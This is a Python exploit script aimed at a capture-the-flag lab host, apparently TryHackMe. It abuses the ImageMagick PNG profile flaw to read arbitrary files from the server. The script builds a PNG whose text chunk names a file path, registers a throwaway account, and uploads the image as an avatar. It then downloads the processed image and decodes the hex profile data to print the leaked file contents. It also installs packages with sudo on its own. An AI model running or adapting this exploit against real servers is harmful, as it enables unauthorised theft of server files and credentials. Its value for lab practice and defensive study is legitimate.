import sys
import argparse 
import urllib.request
import random
import os
import subprocess
import shutil
import requests
import re
import secrets

parser = argparse.ArgumentParser()
pliczek = sys.argv[1]

command = 'convert'
command2 = 'pngcrush'
if shutil.which(command) is None:
    subprocess.run(['sudo','apt','install','graphicsmagick-imagemagick-compat'], check=True)

if shutil.which(command2) is None:
    subprocess.run(['sudo', 'apt', 'install', 'pngcrush'], check=True)

folder_path = "./"

subprocess.run(['pngcrush', '-text', 'a', 'profile', pliczek, "image.png"],check=True, text=True, capture_output=True)


burp_url = "http://site.empman.thm"
upload_url = burp_url + "/users"

session = requests.session()

response = session.get(burp_url+'/users/sign_up')
csrf_token_match = re.search(r'<meta name="csrf-token" content="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_headers = {
    "Cache-Control": "max-age=0",
    "Accept-Language": "en-US",
    "Origin": "http://site.empman.thm",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://site.empman.thm/users/sign_up",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

mail_part = random.randrange(1,1000000000000000000000)

burp_data = {
    "authenticity_token": csrf,
    "user[email]": str(mail_part) + "@xx.com",
    "user[password]": "111111",
    "user[password_confirmation]": "111111",
    "commit": "Sign up"
}

image_path = os.path.join("pngout.png")

with open(image_path, 'rb') as f:
    image_data = f.read()

files = {
    "user[avatar]": ("pngout.png", image_data, "image/png")
}

random_string = secrets.token_hex(8)  

response = session.post(upload_url, headers=burp_headers, data=burp_data, files=files)
encoded_photo_raw = re.search(r'http[^\s">]+',response.text)
encoded_photo_url = encoded_photo_raw.group(0)
urllib.request.urlretrieve(encoded_photo_url, random_string + ".png")

result = subprocess.run(['identify', '-verbose', random_string + ".png"], capture_output=True, text=True)
output = result.stdout

hex_match = re.search(r'Raw profile type:.*\n\n(.*?)(?=\n{2})', output, re.DOTALL)

encoded_file = hex_match.group(1).replace('\n', '').replace(' ', '')
byte_data = bytes.fromhex(encoded_file)
print(byte_data.decode('utf-8', errors='ignore')[1:])
